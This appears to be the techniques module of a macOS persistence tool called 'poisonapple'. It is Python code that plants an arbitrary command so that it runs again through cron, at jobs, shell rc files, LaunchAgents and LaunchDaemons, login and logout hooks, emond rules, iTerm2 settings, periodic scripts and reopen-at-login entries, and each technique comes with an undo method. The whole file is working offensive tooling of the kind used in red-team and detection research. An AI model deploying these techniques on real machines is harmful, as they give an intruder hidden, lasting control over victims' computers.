import os

from poisonapple.util import (
    print_status,
    get_full_path,
    create_cron_job,
    remove_line,
    create_app,
    get_plist,
    write_plist,
    plist_launch_write,
    plist_launch_uninstall,
)


class Technique:
    def __init__(self, technique, name, command, root_required=False):
        self.technique = technique
        self.name = name
        self.command = command
        self.root_required = root_required
        self.success = False
        self.error_message = str()

    def display_result(self):
        if self.success:
            print_status("success", text=self.technique)
        else:
            print_status("failure", text=self.technique)
            print_status("python_error", text=self.error_message)

    @staticmethod
    def execute(func):
        def wrapper(self):
            if self.root_required and not os.geteuid() == 0:
                self.error_message = "Root access is required for this technique."
            else:
                try:
                    func(self)
                    self.success = True
                except Exception as e:
                    self.error_message = str(e)
            self.display_result()
        return wrapper


class AtJob(Technique):
    def __init__(self, name, command):
        super().__init__("AtJob", name, command, root_required=True)
        self.atrun_plist = "/System/Library/LaunchDaemons/com.apple.atrun.plist"

    @Technique.execute
    def run(self):
        os.system(f"launchctl unload -F {self.atrun_plist}")
        os.system(f"launchctl load -w {self.atrun_plist}")
        os.system(f"{self.command} | at +1 minute")

    @Technique.execute
    def remove(self):
        os.system(f"launchctl unload -F {self.atrun_plist}")


class Bashrc(Technique):
    def __init__(self, name, command):
        super().__init__("Bashrc", name, command, root_required=False)
        self.bashrc_path = f"/Users/{os.getlogin()}/.bashrc"

    @Technique.execute
    def run(self):
        os.system(f'echo "{self.command} # {self.name}" >> {self.bashrc_path}')

    @Technique.execute
    def remove(self):
        remove_line(f"# {self.name}", self.bashrc_path)


class Cron(Technique):
    def __init__(self, name, command):
        super().__init__("Cron", name, command, root_required=False)

    @Technique.execute
    def run(self):
        create_cron_job(os.getlogin(), self.command, self.name)

    @Technique.execute
    def remove(self):
        remove_line(
            f"# {self.name}", os.path.join("/usr/lib/cron/tabs/", os.getlogin())
        )


class CronRoot(Technique):
    def __init__(self, name, command):
        super().__init__("CronRoot", name, command, root_required=True)

    @Technique.execute
    def run(self):
        create_cron_job("root", self.command, self.name)

    @Technique.execute
    def remove(self):
        remove_line(f"# {self.name}", "/usr/lib/cron/tabs/root")


class Emond(Technique):
    def __init__(self, name, command):
        super().__init__("Emond", name, command, root_required=True)

    @Technique.execute
    def run(self):
        plist_path = get_full_path("auxiliary/poisonapple.plist")
        trigger_path = get_full_path("auxiliary/poisonapple.sh")
        with open(plist_path) as f:
            plist_data = f.read()
        with open(f"/etc/emond.d/rules/{self.name}.plist", "w") as f:
            f.write(plist_data.format(trigger_path))
        os.system(f"touch /private/var/db/emondClients/{self.name}")

    @Technique.execute
    def remove(self):
        os.remove(f"/etc/emond.d/rules/{self.name}.plist")
        os.remove(f"/private/var/db/emondClients/{self.name}")


class Iterm2(Technique):
    def __init__(self, name, command):
        super().__init__("Iterm2", name, command, root_required=False)
        self.iterm2_plist = (
            f"/Users/{os.getlogin()}/Library/Preferences/com.googlecode.iterm2.plist"
        )

    @Technique.execute
    def run(self):
        plist_data = get_plist(self.iterm2_plist)
        plist_data["New Bookmarks"][0]["Initial Text"] = f"{self.command} && clear"
        write_plist(self.iterm2_plist, plist_data)

    @Technique.execute
    def remove(self):
        plist_data = get_plist(self.iterm2_plist)
        plist_data["New Bookmarks"][0].pop("Initial Text")
        write_plist(self.iterm2_plist, plist_data)


class LaunchAgent(Technique):
    def __init__(self, name, command):
        super().__init__("LaunchAgent", name, command, root_required=True)

    @Technique.execute
    def run(self):
        plist_launch_write(self.name, self.command, 2)

    @Technique.execute
    def remove(self):
        plist_launch_uninstall(self.name, 2)


class LaunchAgentUser(Technique):
    def __init__(self, name, command):
        super().__init__("LaunchAgentUser", name, command, root_required=False)

    @Technique.execute
    def run(self):
        try:
            os.mkdir(os.path.join(f"/Users/{os.getlogin()}", "Library/LaunchAgents"))
        except FileExistsError:
            pass
        plist_launch_write(self.name, self.command, 1)

    @Technique.execute
    def remove(self):
        plist_launch_uninstall(self.name, 1)


class LaunchDaemon(Technique):
    def __init__(self, name, command):
        super().__init__("LaunchDaemon", name, command, root_required=True)

    @Technique.execute
    def run(self):
        plist_launch_write(self.name, self.command, 3)

    @Technique.execute
    def remove(self):
        plist_launch_uninstall(self.name, 3)


class LoginHook(Technique):
    def __init__(self, name, command):
        super().__init__("LoginHook", name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LoginHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system("defaults delete com.apple.loginwindow LoginHook")


class LoginHookUser(Technique):
    def __init__(self, name, command):
        super().__init__("LoginHookUser", name, command, root_required=False)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LoginHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system("defaults delete com.apple.loginwindow LoginHook")


class LoginItem(Technique):
    def __init__(self, name, command):
        super().__init__("LoginItem", name, command, root_required=False)

    @Technique.execute
    def run(self):
        app_path = create_app(self.name, self.command, "LoginItem")
        login_items_add_path = get_full_path("auxiliary/login-items-add.sh")
        os.system(f"{login_items_add_path} {app_path}")

    @Technique.execute
    def remove(self):
        login_items_rm_path = get_full_path("auxiliary/login-items-rm.sh")
        os.system(f"{login_items_rm_path} {self.name}")


class LogoutHook(Technique):
    def __init__(self, name, command):
        super().__init__("LogoutHook", name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LogoutHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system("defaults delete com.apple.loginwindow LogoutHook")


class LogoutHookUser(Technique):
    def __init__(self, name, command):
        super().__init__("LogoutHookUser", name, command, root_required=False)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LogoutHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system("defaults delete com.apple.loginwindow LogoutHook")


class Periodic(Technique):
    def __init__(self, name, command):
        super().__init__("Periodic", name, command, root_required=True)

    @Technique.execute
    def run(self):
        periodic_path = f"/etc/periodic/daily/666.{self.name}"
        with open(periodic_path, "w") as f:
            f.write(f"#!/usr/bin/env bash\n{self.command}")
        os.chmod(periodic_path, 0o755)

    @Technique.execute
    def remove(self):
        os.remove(f"/etc/periodic/daily/666.{self.name}")


class Reopen(Technique):
    def __init__(self, name, command):
        super().__init__("Reopen", name, command, root_required=False)

    def get_plist_paths(self):
        reopen_path = f"/Users/{os.getlogin()}/Library/Preferences/ByHost/"
        plist_paths = [
            os.path.join(reopen_path, f)
            for f in os.listdir(reopen_path)
            if f.startswith("com.apple.loginwindow")
        ]
        if not plist_paths:
            raise Exception("Reopen plist file not found!")
        return plist_paths

    @Technique.execute
    def run(self):
        print_status(
            "warning", "This technique is finicky and might not work as expected, YMMV."
        )
        app_path = create_app(self.name, self.command, "Reopen")
        for path in self.get_plist_paths():
            plist_data = get_plist(path)
            plist_data["TALAppsToRelaunchAtLogin"].append(
                {
                    "Hide": False,
                    "BundleID": self.name,
                    "Path": app_path,
                    "BackgroundState": 2,
                }
            )
            write_plist(path, plist_data)

    @Technique.execute
    def remove(self):
        for path in self.get_plist_paths():
            plist_data = get_plist(path)
            for reopen_dict in plist_data["TALAppsToRelaunchAtLogin"]:
                if reopen_dict["BundleID"] == self.name:
                    plist_data["TALAppsToRelaunchAtLogin"].remove(reopen_dict)
            write_plist(path, plist_data)


class Zshrc(Technique):
    def __init__(self, name, command):
        super().__init__("Zshrc", name, command, root_required=False)
        self.zshrc_path = f"/Users/{os.getlogin()}/.zshrc"

    @Technique.execute
    def run(self):
        os.system(f'echo "{self.command} # {self.name}" >> {self.zshrc_path}')

    @Technique.execute
    def remove(self):
        remove_line(f"# {self.name}", self.zshrc_path)
